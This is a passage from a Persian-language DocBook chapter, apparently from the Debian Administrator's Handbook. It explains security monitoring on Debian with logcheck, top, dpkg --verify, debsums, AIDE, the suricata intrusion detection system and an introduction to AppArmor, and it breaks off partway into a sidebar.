    <para>مانیتورینگ، بنا بر دلایل مختلف، یک بخش جدایی ناپذیر از هر خط مشی امنیتی به حساب می‌آید. از میان آن‌ها، نه تنها هدف امنیت محدود به ضمانت از محرمانگی داده نیست، بلکه شامل دسترسی به سرویس‌ها نیز می‌باشد. پس ضروری است که از عملکرد صحیح اجزا اطلاع داشته  و بتوان در گذر زمان هر گونه انحراف یا تغییر در کیفیت خدمات را تشخیص دهیم. مانیتورینگ می‌تواند به شناسایی تلاش به نفوذ و فعال‌سازی یک اقدام سریع قبل از اینکه عواقب جبران ناپذیر اتفاق بیفتد، کمک کند. این قسمت به بررسی چندین ابزار می‌پردازد که جنبه‌های مختلف مانیتورینگ در یک سیستم دبیان را شامل می‌شوند. از این رو، کامل کننده <xref linkend="sect.monitoring" /> به حساب می‌آید.</para>
    <section id="sect.logcheck">
      <title>مانیتورینگ گزارش‌ها با استفاده از <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>گزارش‌ها</primary><secondary>مانیتورینگ</secondary></indexterm>
      <indexterm><primary>مانیتورینگ</primary><secondary>فایل‌های گزارش</secondary></indexterm>

      <para>برنامه <command>logcheck</command> به صورت پیشفرض در هر ساعت به فایل‌های گزارش نظارت کرده و پیام‌های گزارش غیر معمول را از طریق ایمیل به مدیر سیستم برای تحلیل بیشتر ارسال می‌کند.</para>

      <para>فهرستی از فایل‌های نظارت شده در <filename>/etc/logcheck/logcheck.logfiles</filename> ذخیره‌سازی می‌گردد؛ مقادیر پیشفرض در صورتی کار می‌کنند که فایل <filename>/etc/rsyslog.conf</filename> به صورت کامل بازسازی نشده باشد.</para>

      <para><command>logcheck</command> می‌تواند در یکی از سه حالت موجود کار کند: <emphasis>paranoid</emphasis>، <emphasis>server</emphasis> و <emphasis>workstation</emphasis>. حالت اول شامل جزئیات <emphasis>بسیاری</emphasis> است که تنها باید در مورد سرورهایی نظیر فایروال استفاده گردد. حالت دوم (و پیشفرض) برای اکثر سرورها توصیه می‌شود. حالت آخر نیز در مورد رایانه‌های رومیزی کاربرد دارد که شامل جزئیات کمتری می‌شود (پیام‌های بیشتری را فیلتر می‌کند).</para>

      <para>در هر سه مورد، <command>logcheck</command> به منظور پیشگیری از پیام‌های اضافی باید سفارشی‌سازی گردد (مبتنی بر سرویس‌های نصب شده)، مگر اینکه مدیر سیستم بخواهد به صورت ساعتی فهرستی از ایمیل‌های طولانی و ناخواسته را مشاهده کند. از آنجا که مکانیزم انتخاب پیام به قدری پیچیده است، مطالعه <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> به شدت توصیه می‌شود.</para>

      <para>قوانین اعمال شده می‌توانند به چندین نوع تقسیم شوند:</para>
      <itemizedlist>
        <listitem>
	  <para>آن‌هایی که صلاحیت یک پیام را به عنوان تلاش برای نفوذ در نظر می‌گیرند (که در دایرکتوری <filename>/etc/logcheck/cracking.d/</filename> ذخیره‌سازی می‌شوند)؛</para>
        </listitem>
        <listitem>
	  <para>آن‌هایی که این صلاحیت را نادیده می‌گیرند (<filename>/etc/logcheck/cracking.ignore.d/</filename>)؛</para>
        </listitem>
        <listitem>
	  <para>آن‌هایی که یک پیام را به عنوان هشدار امنیتی طبقه‌بندی می‌کنند (<filename>/etc/logcheck/violations.d/</filename>)؛</para>
        </listitem>
        <listitem>
	  <para>آن‌هایی که این طبقه‌بندی را نادیده می‌گیرند (<filename>/etc/logcheck/violations.ignore.d/</filename>)؛</para>
        </listitem>
        <listitem>
	  <para>در نهایت، آن‌هایی که به پیام‌های باقیمانده اعمال می‌شوند (که به عنوان <emphasis>رویدادهای سیستمی</emphasis> شناخته می‌شوند).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>احتیاط</emphasis> نادیده گرفتن یک پیام</title>

	<para>هر پیامی که به عنوان تلاش برای نفوذ یا هشدار امنیتی برچسب‌گذاری شده باشد (همراه با یک قانون موجود در فایل <filename>/etc/logcheck/violations.d/myfile</filename>) تنها می‌تواند با استفاده از یک قانون در فایل <filename>/etc/logcheck/violations.ignore.d/myfile</filename> یا <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> نادیده گرفته شود.</para>
      </sidebar>

      <para>یک رویداد سیستمی همیشه ارسال می‌شود مگر یکی از قوانین موجود در دایرکتوری‌های <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> بگوید که این رویداد نادیده گرفته شود. البته، تنها دایرکتوری‌هایی به حساب می‌آیند که سطح گزارش برابر یا بیشتر از حالت عملیاتی انتخابی داشته باشند.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>فعالیت مانیتورینگ</title>
      <indexterm><primary>مانیتورینگ</primary><secondary>فعالیت</secondary></indexterm>
      <indexterm><primary>فعالیت، مانیتورینگ</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>در زمان حقیقی</title>

	<para><command>top</command> یک ابزار تعاملی است که فهرستی از فرآیندهای در حال اجرا را نمایش می‌دهد. مرتب‌سازی پیشفرض آن مبتنی بر میزان استفاده فعلی از پردازنده است که می‌تواند با کلید <keycap>P</keycap> مشخص گردد. سایر انواع مرتب‌سازی شامل حافظه مصرفی (کلید <keycap>M</keycap>)، زمان کلی پردازنده (کلید <keycap>T</keycap>) و شناسه فرآیند (کلید <keycap>N</keycap>) می‌باشند. کلید <keycap>k</keycap> اجازه نابودی یک فرآیند با وارد کردن شناسه‌اش را فراهم می‌کند. کلید <keycap>r</keycap> امکان <emphasis>renice</emphasis> یک فرآیند را فراهم می‌کند، که همان تغییر اولویت در اجرا است.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>زمانی که سیستم به نظر سنگین می‌‌آید، <command>top</command> ابزار مناسبی برای شناسایی فرآیندهایی است که بیشترین زمان پردازنده یا بیشترین حافظه مصرفی را دارا می‌باشند. به طور مشخص، اغلب بررسی اینکه آیا فرآیندهای موجود با سرویس‌های متناظر در ماشین سازگاری دارند یا خیر کار جالبی است. یک فرآیند ناشناخته که به عنوان کاربر www-data اجرا شده است باید مورد بررسی و تحلیل قرار گیرد، چرا که به احتمال زیاد یک نمونه از نرم‌افزاری است که توسط آسیب‌پذیری موجود در یک برنامه وب نصب شده است.</para>

	<para><command>top</command> ابزار بسیار منعطفی است و صفحه راهنمای آن جزئیات بیشتری را درباره سفارشی‌کردن برای نیازهای خاص کاربر نمایش می‌دهد.</para>

        <para>ابزار گرافیکی <command>gnome-system-monitor</command> مشابه با <command>top</command> بوده که تقریبا همان ویژگی‌ها را فراهم می‌کند.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>تاریخچه</title>
        <indexterm><primary>فعالیت، تاریخچه</primary></indexterm>

	<para>بار پردازنده، ترافیک شبکه و فضای آزاد دیسک اطلاعاتی هستند که به صورت مداوم در حال تغییر می‌باشند. نگهداری تاریخچه‌ای از میزان مصرف آن‌ها درک خوبی از چگونگی کارکرد رایانه را در اختیار ما قرار می‌دهد.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

	<para>ابزار اختصاصی متفاوتی برای این منظور وجود دارد. اغلب آن‌ها می‌توانند با استفاده از SNMP یا <emphasis>Simple Network Management Protocol</emphasis> اطلاعات را به صورت مرکزی دریافت کنند. یک مزیت اینکار دریافت داده از عناصر شبکه‌ای است که رایانه‌های همه منظوره به حساب نمی‌آیند، از جمله مسیریاب‌ها یا سوئیچ‌های شبکه.</para>

	<para>این کتاب به Munin و برخی جزئیات آن (<xref linkend="sect.munin" /> را مشاهده کنید) که قسمتی از <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" /> است می‌پردازد. دبیان نیز ابزار مشابهی فراهم کرده است، <emphasis role="pkg">cacti</emphasis>. توسعه آن پیچیدگی خاص خود را دارد، چرا که به طور انحصاری بر اساس SNMP کار می‌کند. بر خلاف وجود رابط وب، درک مفاهیم موجود در پیکربندی آن به تلاش زیادی نیاز دارد. از این رو مطالعه مستندات آن (<filename>/usr/share/doc/cacti/html/index.html</filename>) یک پیشنیاز به حساب می‌آید.</para>

        <sidebar>
          <title><emphasis>جایگزین</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (در بسته‌ای با همین نام) ابزاری قدیمی‌تر به حساب می‌آید. بر خلاف برخی جنبه‌های دشوار آن، می‌تواند داده تاریخچه را گردآوری کرده و به صورت نمودار نمایش دهد. این ابزار شامل برخی اسکریپت‌های اختصاصی برای گردآوری متداول‌ترین داده‌های مانیتورینگ از جمله بار پردازنده، ترافیک شبکه، صفحه وب و از این قبیل می‌باشد.</para>

	  <para>بسته‌های <emphasis role="pkg">mrtg-contrib</emphasis> و <emphasis role="pkg">mrtgutils</emphasis> شامل نمونه اسکریپت‌هایی هستند که می‌توان بلافاصله از آن‌ها استفاده کرد.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>تشخیص تغییرات</title>

      <para>زمانی که سیستم نصب و پیکربندی می‌شود، با در نظر گرفتن بروزرسانی‌های امنیتی، دلیلی برای تغییر اکثر فایل‌ها و دایرکتوری‌ها، بجز آن‌ها که از نوع داده‌ای هستند، وجود ندارد. پس اطمینان حاصل کردن از اینکه فایل‌ها تغییر نمی‌کنند امری جالب است: هر تغییر ناخواسته باید مورد بررسی و تحقیق قرار بگیرد. این بخش برخی ابزار کاربردی را برای مانیتور کردن فایل‌ها و هشدار به مدیر سیستم در صورت تغییر ناگهانی آن‌ها معرفی می‌کند.</para>
      <section id="sect.dpkg-verify">
        <title>بازرسی بسته‌ها با استفاده از <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>مطالعه بیشتر</emphasis> محافظت مقابل تغییرات بالادستی</title>

	  <para><command>dpkg --verify</command> در مورد تغییرات انجام شده از یک بسته دبیان کاربرد دارد، اما اگر خود بسته مورد نفوذ گرفته باشد کاربردی ندارد، برای نمونه در حالتی که mirror دبیان ایمن نباشد. محافظت مقابل این کلاس از حملات شامل سیستم تایید امضای دیجیتال APT (<xref linkend="sect.package-authentication" /> را مشاهده کنید) می‌شود، که اینکار تنها بسته‌های قابل اعتماد را نصب خواهد کرد.</para>
        </sidebar>

        <para><command>dpkg --verify</command> یا <command>dpkg -V</command> ابزار جالبی است چرا که امکان جستجوی فایل‌های تغییر یافته از زمان نصب را فراهم می‌کند (که احتمالا توسط مهاجم تغییر یافته‌اند) اما اینکار باید با احتیاط بیشتری صورت پذیرد. برای اینکه بتواند کار خود را انجام دهد نیازمند checksum ذخیره‌سازی شده در پایگاه‌داده dpkg روی هارد دیسک می‌باشد (این فایل‌ها می‌توانند در <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename> پیدا شوند)؛ یک مهاجم بالقوه با بروزرسانی این فایل‌ها از تشخیص فایل‌های تغییر یافته جلوگیری بعمل می‌آورد.</para>

        <sidebar>
          <title><emphasis>بازگشت به مقدمات</emphasis> اثرانگشت فایل</title>
	  <indexterm><primary>اثرانگشت</primary></indexterm>
	  <indexterm><primary>جمع عددی</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>به عنوان یادآوری: یک اثرانگشت شامل مقدار عددی (معمولا به صورت هگزادسیمال) است که شامل نوعی امضا برای محتویات فایل می‌باشد. این امضا توسط یک الگوریتم (از جمله MD5 یا SHA1 که شناخته شده‌اند) محاسبه می‌شود که تضمین می‌کند کوچک‌ترین تغییر در محتویات فایل موجب تغییر اثرانگشت می‌شود؛ این عمل بنام “avalanche effect” شناخته می‌شود. اینکار باعث می‌شود که یک اثرانگشت ساده به عنوان شیوه‌ای برای آزمون صحت محتویات فایل استفاده شود. این الگوریتم‌ها قابل بازگشت نیستند؛ به عبارت دیگر، برای اغلب آن‌ها، دانستن یک اثرانگشت امکان محتوای متناظر با آن را فراهم نمی‌کند. پیشرفت‌های اخیر که در علوم ریاضی بدست آمده است بنظر می‌رسد که قاطعیت این اصول را کاهش داده است، اما کارکرد آن‌ها زیر سوال نرفته است، چرا که تولید محتوای متفاوت که اثرانگشت یکسانی داشته باشند همچنان کار بسیار دشواری است.</para>
        </sidebar>

        <para>اجرای <command>dpkg -V</command> تمام بسته‌های نصب شده را مورد بررسی قرار داده و به ازای هر کدام که در این آزمون شکست بخورند در خط جداگانه‌ای نمایش داده می‌شود. قالب خروجی مشابه با <command>rpm -V</command> است که در آن هر کاراکتر بیانگر یک آزمون روی اطلاعات جانبی بسته است. متاسفانه <command>dpkg</command> اطلاعات جانبی مورد نیاز بسته را ذخیره‌سازی نمی‌کند و آن‌ها را به صورت علامت سوال در خروجی نمایش می‌دهد. در حال حاضر تنها آزمون checksum منجر به تولید "5" در سومین کاراکتر آن (زمانی که شکست بخورد) می‌شود.</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>در نمونه بالا، dpkg یک تغییر در فایل سرویس SSH را گزارش می‌دهد که مدیر سیستم در مورد فایل بسته اعمال کرده است بجای تغییر در فایل پیکربندی آن واقع در <filename>/etc/systemd/system/ssh.service</filename> (که مانند هر فایل پیکربندی دیگر در <filename>/etc</filename> ذخیره‌سازی می‌شود). همچنین فهرستی از فایل‌های پیکربندی دیگر که به صورت قانونی تغییر یافته‌اند را با حرف "c" در فیلد دوم نمایش می‌دهد.</para>
      </section>

      <section id="sect.debsums">
        <title>بازرسی بسته‌ها: <command>debsums</command> و محدودیت‌های آن</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> جد <command>dpkg -V</command> به حساب می‌آید و از این رو منسوخ شده است. از همان محدودیت‌های dpkg نیز رنج می‌برد. خوشبختانه می‌توان به برخی محدودیت‌های آن غلبه کرد، با اینکه dpkg راهکاری برای آن‌ها ندارد.</para>

        <para>از آنجا که نمی‌توان به داده روی دیسک اعتماد کرد، <command>debsums</command> پیشنهاد می‌کند که بجای پایگاه‌داده dpkg از فایل‌های <filename>.deb</filename> به منظور آزمون استفاده شود. برای دانلود فایل‌های <filename>.deb</filename> بسته‌های نصب شده، می‌توان روی مکانیزم احرازهویت APT حساب باز کرد. این عملیات می‌تواند کند و خسته‌کننده باشد، پس نباید به عنوان تکنیکی موثر به صورت روزانه مورد استفاده قرار گیرد.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>به یاد داشته باشید که در این مثال از دستور <command>grep-status</command> واقع در بسته <emphasis role="pkg">dctrl-tools</emphasis> استفاده شده است، که به صورت پیشفرض نصب نمی‌باشد.</para>
      </section>
      <section>
        <title>مانیتورینگ فایل‌ها: AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (بسته دبیان)</primary></indexterm>

	<para>ابزار AIDE یا <emphasis>Advanced Intrusion Detection Environment</emphasis> امکان بررسی جامعیت فایل را فراهم می‌کند و هرگونه تغییر مقابل image نسخه پیشین از سیستم معتبر را تشخیص می‌دهد. این image به عنوان یک پایگاه‌داده ذخیره‌سازی می‌شود (<filename>/var/lib/aide/aide.db</filename>) که شامل اطلاعات مرتبط درباره تمام فایل‌های سیستم است (اثرانگشت‌ّها، مجوزها، بازه‌های زمانی و از این قبیل). این پایگاه‌داده ابتدا توسط <command>aideinit</command> راه‌اندازی می‌شود؛ سپس به صورت روزانه توسط اسکریپت <filename>/etc/cron.daily/aide</filename> به منظور بررسی برای عدم تغییر فایل‌های مرتبط استفاده می‌گردد. زمانی که تغییر تشخیص داده شود، AIDE آن‌ها را در فایل‌های گزارش (<filename>/var/log/aide/*.log</filename>) ثبت کرده و مشاهدات خود ار از طریق ایمیل برای مدیر سیستم ارسال می‌کند.</para>

        <sidebar>
          <title><emphasis>در عمل</emphasis> محافظت از پایگاه‌داده</title>

	  <para>از آنجا که AIDE از یک پایگاه‌داده محلی برای مقایسه حالت‌های یک فایل استفاده می‌کند، اعتبار نتایج آن به طور مستقیم در گرو اعتبار پایگاه‌داده می‌باشد. اگر مهاجم بتواند مجوز root سیستم نفوذ شده را کسب نماید، می‌تواند پایگاه‌داده را جایگزین کرده و رد خود را از بین ببرد. یک راهکار احتمالی ذخیره‌سازی داده مرجع در یک رسانه فقط-خواندنی است.</para>
        </sidebar>

	<para>گزینه‌های بسیاری در <filename>/etc/default/aide</filename> وجود دارد که می‌تواند برای تغییر عملکرد بسته <emphasis role="pkg">aide</emphasis> مورد استفاده قرار گیرد. فایل‌های پیکربندی AIDE در <filename>/etc/aide/aide.conf</filename> و <filename>/etc/aide/aide.conf.d/</filename> ذخیره‌سازی شده‌اند (در حقیقت، این فایل‌ها تنها توسط <command>update-aide.conf</command> برای تولید <filename>/var/lib/aide/aide.conf.autogenerated</filename> مورد استفاده قرار می‌گیرند). پیکربندی شامل ویژگی‌های خاص هر فایل می‌باشد که باید مورد بررسی قرار گیرند. برای نمونه، محتوای فایل‌های گزارش به صورت مداوم تغییر می‌یابد و اینگونه تغییرات مادامی که مجوزهای این فایل‌ها تغییر نکند می‌توانند نادیده گرفته شوند، اما هر دو محتوا و مجوزهای برنامه‌های اجرایی باید ثابت باقی بمانند. با اینکه ساختار پیچیده‌ای ندارد، شیوه نگارش پیکربندی آن نیز ساده نیست و مطالعه صفحه راهنمای <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> توصیه می‌گردد.</para>

	<para>یک نسخه جدید از پایگاه‌داده به صورت روزانه در <filename>/var/lib/aide/aide.db.new</filename> تولید می‌شود؛ اگر تمام تغییرات ثبت شده قانونی باشند، می‌تواند جایگزین پایگاه‌داده مرجع شود.</para>

        <sidebar>
          <title><emphasis>جایگزین</emphasis> Tripwire و Samhain</title>

	  <para>Tripwire بسیار مشابه با AIDE عمل می‌کند؛ حتی شیوه نگارش فایل پیکربندی آن نیز تقریبا یکسان است. قابلیت اضافه‌ای که در <emphasis role="pkg">tripwire</emphasis> وجود دارد مکانیزم امضای فایل پیکربندی است، تا یک مهاجم نتواند آن را به نسخه‌ای دیگر از پایگاه‌داده مرجع اشاره دهد.</para>

	  <para>Samhain نیز برخی ویژگی‌های مشابه را فراهم می‌کند، همراه با برخی توابع که می‌توانند در تشخیص rootkitها یاری رسانند (قسمت <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" /> را مشاهده کنید). همچنین می‌تواند به صورت سراسری روی شبکه توزیع گردد و مشاهدات خود را در یک سرور مرکزی ذخیره‌سازی نماید (همراه با یک امضا).</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>نگاه سریع</emphasis> بسته‌های <emphasis role="pkg">checksecurity</emphasis> و <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>اولین بسته شامل چندین اسکریپت کوچک است که با بررسی سیستم (گذرواژه‌های خالی، فایل‌های جدید setuid و از این قبیل) در زمان مناسب به مدیر سیستم هشدار می‌دهد. بر خلاف نام آن، مدیر سیستم نباید برای ایمنی سیستم لینوکس تنها به این بسته متکی باشد.</para>

	  <para>بسته‌های <emphasis role="pkg">chkrootkit</emphasis> و <emphasis role="pkg">rkhunter</emphasis> امکان بررسی <emphasis>rootkit</emphasis> احتمالی نصب شده روی سیستم را می‌دهند. به عنوان یادآوری، این‌ها برنامه‌هایی هستند که با مخفی نگاه داشتن حضور خود از دید سیستم نسبت به کنترل کامل ماشین اقدام می‌کنند. این آزمون‌ها ۱۰۰٪ قابل اطمینان نبوده ولی نقطه شروع مناسبی برای کاوش بین مشکلات احتمالی را برای مدیر سیستم نشان می‌دهند.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>تشخیص نفوذ (IDS/NIDS)</title>
      <indexterm><primary>تشخیص، نفوذ</primary></indexterm>
      <indexterm><primary>تشخیص نفوذ</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>intrusion detection system</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>Network</primary><secondary>IDS</secondary></indexterm>

      <sidebar>
        <title><emphasis>بازگشت به مقدمات</emphasis> Denial of Service</title>
        <indexterm><primary>denial of service</primary></indexterm>

	<para>یک حمله “Denial of Service” تنها یک هدف دارد: خارج کردن یک سرویس از دسترسی. خواه این حمله با بارگذاری پرس و جوهای سنگین روی سرور یا آسیب‌پذیری یک باگ صورت گیرد، نتیجه یکسان خواهد بود: سرویس دیگر عملیاتی نخواهد بود. کاربران عادی ناراضی می‌شوند و موجودیتی که از شبکه هدف میزبانی می‌کند اعتبار خود را از دست رفته می‌بیند (و احتمالا سود خود را، در صورتی که یک سایت فروشگاهی آنلاین مد نظر باشد).</para>

	<para>چنین حمله‌ای بعضی وقت‌ها به صورت “distributed” انجام می‌شود؛ اینکار با استفاده از منابع مختلف که پرس و جوهای سنگین را روی سرور بارگذاری می‌کنند انجام شده تا سرور نتواند به پرس و جوهای مجاز پاسخ دهد. این گونه حملات عبارت‌های مترادفی را همراه خود دارند: <acronym>DDoS</acronym> و <acronym>DoS</acronym> (بر اساس اینکه حمله به صورت توزیع شده انجام شده است یا خیر).</para>
      </sidebar>

      <para><command>suricata</command> (در بسته‌ای با همین نام) یک NIDS که مخفف <emphasis>Network Intrusion Detection System</emphasis> است یا سیستم تشخیص نفوذ شبکه‌ای  به حساب می‌آید. وظیفه آن گوش دادن به شبکه و تشخیص تلاش‌های نفوذ احتمالی و/یا اقدامات خرابکارانه است (از جمله حملات DoS). تمام این رویدادها در فایل‌های گوناگون موجود در <filename>/var/log/suricata</filename> به صورت گزارش ذخیره‌سازی می‌شوند. ابزار شخص ثالث دیگری مانند Kibana یا logstash وجود دارد که برای پیمایش بهتر این داده‌ها بکار می‌روند. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>احتیاط</emphasis> محدوده عملیات</title>

	<para>میزان اثرگذاری <command>suricata</command> محدود به ترافیک مشاهده شده در رابط شبکه مانیتورینگ است. اگر نتواند ترافیک واقعی را مشاهده کند نمی‌تواند تشخیص مناسبی را انجام دهد. زمان که به یک سوئیچ شبکه متصل می‌شود، تنها حملاتی را مانیتور می‌کند که یکی از ماشین‌های شبکه را هدف قرار گیرند که این مورد مطلوب نظر نیست. ماشینی که از <command>suricata</command> میزبانی می‌کند باید به درگاه “mirror” از سوئیچ متصل شود، که معمولا این درگاه برای تعویض سوئیچ‌ها اختصاص می‌یابد و از این رو می‌تواند تمام ترافیک شبکه را مشاهده کند.</para>
      </sidebar>

      <para>پیکربندی suricata شامل بازبینی و ویرایش فایل <filename>/etc/suricata/suricata-debian.yaml</filename> است، که بسیار طولانی بوده و هر پارامتر آن به صورت مفصل توضیح داده شده است. یک پیکربندی حداقلی نیازمند محدوده نشانی‌هایی است که شبکه محلی آن‌ها را پوشش می‌دهد (پارامتر <literal>HOME_NET</literal>). در عمل، این به معنی مجموعه اهداف قابل حمله است. اما استفاده از آن نیازمند درک کامل ویژگی‌ها و منطبق ساختن با وضعیت محلی است.</para>
      <para>قبل از آن، باید فایل <filename>/etc/default/suricata</filename> را برای تعریف رابط شبکه به منظور مانیتورینگ ویرایش کرده و اسکریپت راه‌اندازی آن را فعال کنید (با تنظیم <literal>RUN=yes</literal>). البته شاید بخواهید <literal>LISTENMODE=pcap</literal> را انجام دهید چرا که تنظیم پیشفرض <literal>LISTENMODE=nfqueue</literal> نیازمند پیکربندی پیچیده‌تری است (فایروال netfilter باید طوری پیکربندی شود که بسته‌های فضای کاربر از طرف suricata و با استفاده از <literal>NFQUEUE</literal> مدیریت شوند).</para>
      <para>برای تشخیص عملکرد بد، <command>suricata</command> نیازمند مجموعه‌ای از قوانین مانیتورینگ است: چنین قوانینی را می‌توانید در بسته <emphasis role="pkg">snort-rules-default</emphasis> پیدا کنید. <command>snort</command> مرجع تاریخی در اکوسیستم IDS به حساب می‌آید و <command>suricata</command> می‌تواند از قوانین موجود آن استفاده کند. متاسفانه این بسته در نسخه <emphasis role="distribution">Jessie</emphasis> از دبیان وجود نداشته و باید از طریق انتشار <emphasis role="distribution">Testing</emphasis> یا <emphasis role="distribution">Unstable</emphasis> بدست آید.</para>
      <para>به صورت جایگزین از <command>oinkmaster</command> (در بسته‌ای با همین نام) می‌توان برای دانلود مجموعه قوانین Snort از منابع خارجی استفاده کرد.</para>
      <sidebar>
        <title><emphasis>مطالعه بیشتر</emphasis> یکپارچگی با <command>prelude</command></title>

	<para>Prelude امکان مانیتورینگ مرکزی از اطلاعات امنیتی را بوجود می‌آورد. معماری ماژولار آن شامل یک سرور (<emphasis>manager</emphasis> در بسته <emphasis role="pkg">prelude-manager</emphasis>) است که هشدارهای تولید شده توسط <emphasis>سنسورهای</emphasis> گوناگون را دریافت می‌کند.</para>

	<para>Suricata می‌تواند به عنوان چنین سنسوری پیکربندی شود. سایر احتمالات شامل <emphasis>prelude-lml</emphasis> (یا <emphasis>Log Monitor Lackey</emphasis>) می‌شود که می‌تواند فایل‌های گزارش را مانیتور کند (به شیوه‌ای مشابه با <command>logcheck</command> که در قسمت <xref linkend="sect.logcheck" /> توضیح داده شده است).</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>مقدمه‌ای بر AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>اصول</title>
      <para>AppArmor یک سیستم کنترل دسترسی ضروری یا <emphasis>Mandatory Access Control</emphasis> (MAC) است که درون رابط ماژول‌های امنیتی لینوکس یا <emphasis>Linux Security Modules</emphasis> (LSM) پیاده‌سازی شده است. در عمل، کرنل قبل از هر فراخوانی سیستمی از AppArmor پرس و جو می‌کند تا بداند آیا فرآیند مجاز به انجام عملیات مذکور است یا خیر. از طریق این مکانیزم، AppArmor برنامه‌ها را محدود به مجموعه کوچکی از منابع می‌کند.</para>
      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
      <para>AppArmor مجموعه‌ای از قوانین (که بنام “پروفایل” شناخته می‌شوند) را روی هر برنامه اعمال می‌کند. پروفایل اعمال شده توسط کرنل وابسته با مکان نصب اولیه برنامه اجرایی است. بر خلاف SELinux (که در قسمت <xref linkend="sect.selinux" /> توضیح داده شده است)، قوانین اعمال شده مبتنی بر کاربر نیستند. تمام کاربران هنگام اجرای برنامه مشابه از یک مجموعه قوانین پیروی می‌کنند (اما مجوزهای سنتی کاربری هنوز برقرار بوده و ممکن است عملکرد متفاوتی داشته باشند!).</para>
      <para>پروفایل‌های AppArmor در <filename>/etc/apparmor.d/</filename> ذخیره‌سازی شده و شامل فهرستی از قوانین کنترل دسترسی هستند که منابع مختلف را برای هر برنامه مشخص می‌کنند. پروفایل‌ها با استفاده از دستور <command>apparmor_parser</command> کامپایل شده و درون کرنل قرار می‌گیرند. هر پروفایل تنها می‌تواند در یکی از حالت‌های enforcing یا complaining بارگیری شود. اولی با توجه به خط مشی امنیتی، تلاش‌های خرابکارانه را گزارش می‌دهد در صورتی که دومی اجباری در پیروی از خط مشی نداشته ولی فراخوانی‌های سیستمی غیرمجاز را ذخیره‌سازی می‌کند.</para>
    </section>
    <section id="sect.apparmor-setup">
      <title>فعال‌سازی و مدیریت پروفایل‌های AppArmor</title>
      <para>پشتیبانی از AppArmor در کرنل‌های استاندارد دبیان وجود دارد. از این رو، فعال‌سازی AppArmor  به سادگی نصب چند بسته و افزودن برخی پارامترها به خط فرمان کرنل است:</para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>پس از راه‌اندازی مجدد سیستم، AppArmor عملیاتی بوده و می‌توان وضعیت آن را با استفاده از <command>aa-status</command> بررسی کرد:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>یادداشت</emphasis> پروفایل‌های بیشتر AppArmor</title>
